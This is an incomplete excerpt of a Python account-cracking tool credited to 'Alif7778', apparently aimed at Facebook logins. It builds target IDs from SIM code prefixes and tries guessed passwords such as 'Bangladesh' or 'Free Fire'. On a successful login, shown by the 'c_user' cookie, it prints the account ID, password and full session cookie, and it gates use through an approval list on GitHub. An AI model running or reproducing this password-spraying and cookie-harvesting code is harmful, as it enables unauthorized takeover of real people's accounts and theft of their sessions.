...
logo = """
         \033[1;37m     ___       __       __   _______ 
         \033[1;37m    /   \     |  |     |  | |   ____|
         \033[1;37m    /  ^  \    |  |     |  | |  |__   
         \033[1;37m  /  /_\  \   |  |     |  | |   __|  
         \033[1;37m  /  _____  \  |  `----.|  | |  |     
         \033[1;37m/__/     \__\ |_______||__| |__|     
         \033[1;37m ######  ##     ## ##    ## ##     ## \033[1;32m LPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mAlif7778\033[1;37m
...
def bd():
	...
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE : 88017,88019**,88016,.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : Alif12345, Bangladesh,Free Fire,Etc')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Alif-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[Alif-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAlif7778\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Alif7778/Apr/blob/main/Apr.txt').text
    if id in httpCaht:
